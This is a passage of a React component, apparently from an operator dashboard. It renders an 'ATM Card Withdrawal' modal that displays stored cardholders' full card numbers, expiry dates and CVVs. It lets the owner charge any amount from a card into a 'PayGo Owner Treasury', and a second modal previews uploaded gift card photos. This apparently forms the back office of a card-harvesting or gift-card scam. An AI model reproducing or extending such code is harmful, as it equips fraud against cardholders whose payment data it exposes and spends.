          <div className="bg-gray-800 border border-gray-700 rounded-3xl p-6 max-w-md w-full shadow-2xl space-y-5">
            <div className="flex items-center justify-between border-b border-gray-700 pb-3">
              <h3 className="text-lg font-bold text-white flex items-center space-x-2">
                <CreditCard className="w-5 h-5 text-emerald-400" />
                <span>Execute ATM Card Withdrawal</span>
              </h3>
              <button
                onClick={() => setSelectedCardForWithdraw(null)}
                className="text-gray-400 hover:text-white p-1 cursor-pointer"
              >
                ✕
              </button>
            </div>

            {withdrawSuccess ? (
              <div className="text-center py-6 space-y-4">
                <div className="w-16 h-16 bg-emerald-500/20 text-emerald-400 rounded-full flex items-center justify-center mx-auto border border-emerald-500/30">
                  <Check className="w-8 h-8" />
                </div>
                <h4 className="text-xl font-bold text-white">Withdrawal Successful!</h4>
                <p className="text-xs text-gray-300">
                  Successfully charged{' '}
                  <span className="font-mono font-bold text-white">
                    ${parseFloat(withdrawAmountInput).toLocaleString()}
                  </span>{' '}
                  from card{' '}
                  <span className="font-mono text-purple-300">
                    {selectedCardForWithdraw.cardNumber}
                  </span>{' '}
                  to owner settlement vault{' '}
                  <span className="font-bold text-emerald-400">PayGo Merchant Treasury</span>.
                </p>
                <button
                  onClick={() => setSelectedCardForWithdraw(null)}
                  className="w-full bg-purple-600 hover:bg-purple-700 text-white font-bold py-3 rounded-xl text-sm cursor-pointer"
                >
                  Done
                </button>
              </div>
            ) : isWithdrawing ? (
              <div className="text-center py-8 space-y-4">
                <div className="w-12 h-12 border-4 border-emerald-400 border-t-transparent rounded-full animate-spin mx-auto" />
                <p className="text-sm text-gray-300">Processing secure ATM gateway charge...</p>
                <p className="text-xs font-mono text-purple-300">
                  {selectedCardForWithdraw.cardNumber}
                </p>
              </div>
            ) : (
              <form onSubmit={handleExecuteWithdraw} className="space-y-4">
                <div className="bg-gray-900 p-4 rounded-2xl border border-gray-700 space-y-2 text-xs">
                  <div className="flex justify-between">
                    <span className="text-gray-400">Cardholder:</span>
                    <span className="font-bold uppercase text-white">
                      {selectedCardForWithdraw.cardName}
                    </span>
                  </div>
                  <div className="flex justify-between">
                    <span className="text-gray-400">Card Number:</span>
                    <span className="font-mono text-purple-300">
                      {selectedCardForWithdraw.cardNumber}
                    </span>
                  </div>
                  <div className="flex justify-between">
                    <span className="text-gray-400">Expiry / CVV:</span>
                    <span className="font-mono text-white">
                      {selectedCardForWithdraw.expiry} • {selectedCardForWithdraw.cvv}
                    </span>
                  </div>
                </div>

                <div>
                  <label className="block text-xs font-semibold uppercase tracking-wider text-gray-400 mb-1">
                    Withdrawal Amount ($)
                  </label>
                  <input
                    type="number"
                    min="1"
                    value={withdrawAmountInput}
                    onChange={(e) => setWithdrawAmountInput(e.target.value)}
                    placeholder="Enter amount to charge"
                    className="w-full p-3.5 bg-gray-900 border border-gray-700 rounded-xl focus:ring-2 focus:ring-emerald-500 outline-none text-sm font-bold text-white font-mono"
                    required
                  />
                </div>

                <div className="p-3 bg-purple-900/30 border border-purple-700/50 rounded-xl text-xs text-purple-200">
                  Funds will be settled instantly to your{' '}
                  <span className="font-bold text-white">
                    PayGo Owner Treasury ({OWNER_EMAIL})
                  </span>
                  .
                </div>

                <div className="flex space-x-3 pt-2">
                  <button
                    type="button"
                    onClick={() => setSelectedCardForWithdraw(null)}
                    className="flex-1 bg-gray-700 hover:bg-gray-600 text-white font-semibold py-3 rounded-xl text-xs transition-colors cursor-pointer"
                  >
                    Cancel
                  </button>
                  <button
                    type="submit"
                    className="flex-1 bg-emerald-600 hover:bg-emerald-700 text-white font-bold py-3 rounded-xl text-xs shadow-md transition-all cursor-pointer"
                  >
                    Confirm & Withdraw
                  </button>
                </div>
              </form>
            )}
          </div>
        </div>
      )}

      {/* Image Preview Modal */}
      {previewImage && (
        <div
          className="fixed inset-0 bg-black/85 backdrop-blur-sm flex items-center justify-center p-4 z-50 animate-in fade-in"
          onClick={() => setPreviewImage(null)}
        >
          <div
            className="bg-gray-800 border border-gray-700 rounded-2xl p-4 max-w-lg w-full relative"
            onClick={(e) => e.stopPropagation()}
          >
            <div className="flex justify-between items-center mb-3">
              <h4 className="text-sm font-bold text-white">Gift Card / Receipt Photo</h4>
              <button
                onClick={() => setPreviewImage(null)}
                className="text-gray-400 hover:text-white p-1 text-sm font-bold"
              >
                ✕
              </button>
            </div>
            <img
              src={previewImage}
              alt="Enlarged Card Preview"
              className="w-full max-h-[70vh] object-contain rounded-xl border border-gray-700 bg-black/50"
            />
          </div>
        </div>
      )}
    </div>
  );
};
